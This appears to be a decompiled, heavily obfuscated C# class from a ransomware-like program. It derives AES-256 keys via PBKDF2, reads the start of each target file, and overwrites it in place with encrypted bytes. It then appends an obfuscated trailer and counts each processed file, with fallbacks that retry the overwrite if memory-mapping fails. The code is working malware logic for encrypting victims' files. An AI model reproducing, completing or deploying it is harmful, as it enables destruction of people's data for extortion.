using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

public static class DwwAAJBOSmbJ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] ZUYcQJLxxSxnH(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = YxaMZjgcnHxxxGn(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static Rfc2898DeriveBytes YxaMZjgcnHxxxGn(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] fENIZKTbvW(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (aSOyqwTwiifNb.QtTrkEhpkGUJgMO == getString_0(107396920))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (aSOyqwTwiifNb.CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(aSOyqwTwiifNb.dtHHyJMWMTcTg, getString_0(107386467) + string_0 + getString_0(107398545) + ex.Message + getString_0(107395857));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
	}

	public static bool IjvngclRYVi(string rfRQjrzTSbahvMj, byte[] PLFvJzqFVyEE, byte[] CYHcaFOGLSEpY = null)
	{
		try
		{
			byte[] array = null;
			if (aSOyqwTwiifNb.QtTrkEhpkGUJgMO == getString_0(107396920))
			{
				array = (aSOyqwTwiifNb.PAOJgADrbjEa ? Encoding.ASCII.GetBytes(aSOyqwTwiifNb.FEZRNsQdHf(aSOyqwTwiifNb.nmjDhIwEGnMOrO) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398519)) + Convert.ToString(aSOyqwTwiifNb.UawyhGBHBLgS) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398519))) : Encoding.ASCII.GetBytes(aSOyqwTwiifNb.FEZRNsQdHf(aSOyqwTwiifNb.nmjDhIwEGnMOrO) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398528)) + Convert.ToString(aSOyqwTwiifNb.UawyhGBHBLgS) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398528))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(rfRQjrzTSbahvMj, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(PLFvJzqFVyEE, 0, PLFvJzqFVyEE.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(rfRQjrzTSbahvMj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!aSOyqwTwiifNb.PAOJgADrbjEa)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(CYHcaFOGLSEpY, 0, CYHcaFOGLSEpY.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (aSOyqwTwiifNb.PAOJgADrbjEa ? Encoding.ASCII.GetBytes(aSOyqwTwiifNb.FEZRNsQdHf(aSOyqwTwiifNb.nmjDhIwEGnMOrO) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398519)) + Convert.ToString(aSOyqwTwiifNb.UawyhGBHBLgS) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398519))) : Encoding.ASCII.GetBytes(aSOyqwTwiifNb.FEZRNsQdHf(aSOyqwTwiifNb.nmjDhIwEGnMOrO) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398528)) + Convert.ToString(aSOyqwTwiifNb.UawyhGBHBLgS) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398528))));
				FileStream fileStream2 = new FileStream(rfRQjrzTSbahvMj, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(PLFvJzqFVyEE, 0, PLFvJzqFVyEE.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream = new FileStream(rfRQjrzTSbahvMj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!aSOyqwTwiifNb.PAOJgADrbjEa)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(CYHcaFOGLSEpY, 0, CYHcaFOGLSEpY.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			aSOyqwTwiifNb.qXIAEocyZgLqByS++;
		}
		catch (Exception ex)
		{
			if (aSOyqwTwiifNb.CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(aSOyqwTwiifNb.dtHHyJMWMTcTg, getString_0(107386467) + rfRQjrzTSbahvMj + getString_0(107398478) + ex.Message + getString_0(107395857));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array = null;
				array = (aSOyqwTwiifNb.PAOJgADrbjEa ? Encoding.ASCII.GetBytes(aSOyqwTwiifNb.FEZRNsQdHf(aSOyqwTwiifNb.nmjDhIwEGnMOrO) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398519)) + Convert.ToString(aSOyqwTwiifNb.UawyhGBHBLgS) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398519))) : Encoding.ASCII.GetBytes(aSOyqwTwiifNb.FEZRNsQdHf(aSOyqwTwiifNb.nmjDhIwEGnMOrO) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398528)) + Convert.ToString(aSOyqwTwiifNb.UawyhGBHBLgS) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398528))));
				FileStream fileStream2 = new FileStream(rfRQjrzTSbahvMj, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(PLFvJzqFVyEE, 0, PLFvJzqFVyEE.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using (FileStream fileStream = new FileStream(rfRQjrzTSbahvMj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!aSOyqwTwiifNb.PAOJgADrbjEa)
					{
						fileStream.Write(array, 0, array.Length);
					}
					else
					{
						fileStream.Write(CYHcaFOGLSEpY, 0, CYHcaFOGLSEpY.Length);
						fileStream.Write(array, 0, array.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static DwwAAJBOSmbJ()
	{
		Strings.CreateGetStringDelegate(typeof(DwwAAJBOSmbJ));
	}
}
